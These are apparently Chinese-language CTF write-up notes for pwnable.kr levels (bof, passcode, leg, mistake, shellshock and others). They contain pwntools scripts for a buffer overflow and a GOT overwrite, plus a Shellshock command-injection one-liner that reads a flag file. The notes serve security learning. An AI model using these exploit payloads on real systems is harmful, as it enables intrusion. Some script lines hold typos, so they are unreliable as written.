## fd
read 函数标准输入
执行一个shell命令行时通常会自动打开三个标准文件，即标准输入文件（fd=0，stdin），通常对应终端的键盘；标准输出文件（fd=1，stdout）和标准错误输出文件（fd=2，stderr），这两个文件都对应终端的屏幕。进程将从标准输入文件中得到输入数据，将正常输出数据输出到标准输出文件，而将错误信息送到标准错误文件中。

## bof
溢出用 s 溢出覆盖 a1
```python
from pwn import *
a1=0xcafebabe
p=process('./bof')
pay='a'*(0x2c+0x8)+p32(a1)
p.sendline(pay)
p.interactive()
```
objdump -d XXX 反编译
objdump -R XXX got 表入口

## flag
就一个 upx 壳
upx -d XXX 蜕壳
用 ida64 查看就行
## passcode
scanf 函数不加 & 造成任意位置读写
这里修改 got 表
```python
from pwn import *
p=porcess('./passcode')
print_addr=0x804a000 # 其它几个函数也行
sys_addr=134514147 # %d 所以用 int
pay='a'(0x70-0x10)+p32(print_addr) # name 位置在 -0x70（%ebp） passcode1 在 -0x10（%ebp）
# name 只有 96 个字节，但输入的限制为 100，剩下的 4 个字节刚好可以覆盖 passcode1

p.sendline(pay)
p.sendline(str(sys_addr))

p.interactive()
```
## random
没有初始化随机种子，每次随机出来的数都一样
写个 c++ 程序发现都是是 1804289383，亦或后为 3039230856
输入即可
gcc XXX.cpp -o XXX
## input
- [x] 未完

scp -P 2222 inputpwn.c input@pwnable.kr:/tmp
## leg
arm 汇编
r0 存放返回值
pc 指向要执行的下一条语句的下一条语句
lr 指向函数返回后要执行的下一条语句
```asm
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:	push	{r4, r11, lr}
   0x00008d40 <+4>:	add	r11, sp, #8
   0x00008d44 <+8>:	sub	sp, sp, #12
   0x00008d48 <+12>:	mov	r3, #0
   0x00008d4c <+16>:	str	r3, [r11, #-16]
   0x00008d50 <+20>:	ldr	r0, [pc, #104]	; 0x8dc0 <main+132>
   0x00008d54 <+24>:	bl	0xfb6c <printf>
   0x00008d58 <+28>:	sub	r3, r11, #16
   0x00008d5c <+32>:	ldr	r0, [pc, #96]	; 0x8dc4 <main+136>
   0x00008d60 <+36>:	mov	r1, r3
   0x00008d64 <+40>:	bl	0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:	bl	0x8cd4 <key1>
   0x00008d6c <+48>:	mov	r4, r0
   0x00008d70 <+52>:	bl	0x8cf0 <key2>
   0x00008d74 <+56>:	mov	r3, r0
   0x00008d78 <+60>:	add	r4, r4, r3
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0
   0x00008d84 <+72>:	add	r2, r4, r3
   0x00008d88 <+76>:	ldr	r3, [r11, #-16]
   0x00008d8c <+80>:	cmp	r2, r3
   0x00008d90 <+84>:	bne	0x8da8 <main+108>
   0x00008d94 <+88>:	ldr	r0, [pc, #44]	; 0x8dc8 <main+140>
   0x00008d98 <+92>:	bl	0x1050c <puts>
   0x00008d9c <+96>:	ldr	r0, [pc, #40]	; 0x8dcc <main+144>
   0x00008da0 <+100>:	bl	0xf89c <system>
   0x00008da4 <+104>:	b	0x8db0 <main+116>
   0x00008da8 <+108>:	ldr	r0, [pc, #32]	; 0x8dd0 <main+148>
   0x00008dac <+112>:	bl	0x1050c <puts>
   0x00008db0 <+116>:	mov	r3, #0
   0x00008db4 <+120>:	mov	r0, r3
   0x00008db8 <+124>:	sub	sp, r11, #8
   0x00008dbc <+128>:	pop	{r4, r11, pc}
   0x00008dc0 <+132>:	andeq	r10, r6, r12, lsl #9
   0x00008dc4 <+136>:	andeq	r10, r6, r12, lsr #9
   0x00008dc8 <+140>:			; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:			; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:	andeq	r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.
(gdb) 
```
key1=0x8ce4
key2=0x8d08+0x4
key3=0x8d80
key1+key2+key3=108400
## mistake
提示操作优先级，然而完全没有想到
问题在于：
```cpp
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}
```
< 的优先级高于 = 
所以先比较，再对 fd 进行赋值
而 open 打开文件后返回值大于 0
所以 fd 必定等于 0
后面的 read pw_buf 就变成了 stdin
所以 pw_buf 和 pw_buf2 的值均可控
随便构造 pw_buf^1111111111=pw_buf2 即可

**以后一定要关注对 fd 的相关操作**
## shellshock
2014 年的一个 10 级漏洞
env var='() { :;}; cat flag' ./shellshock
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTIyNTE2NDI3NCwtNDMxODc0ODg4XX0=
-->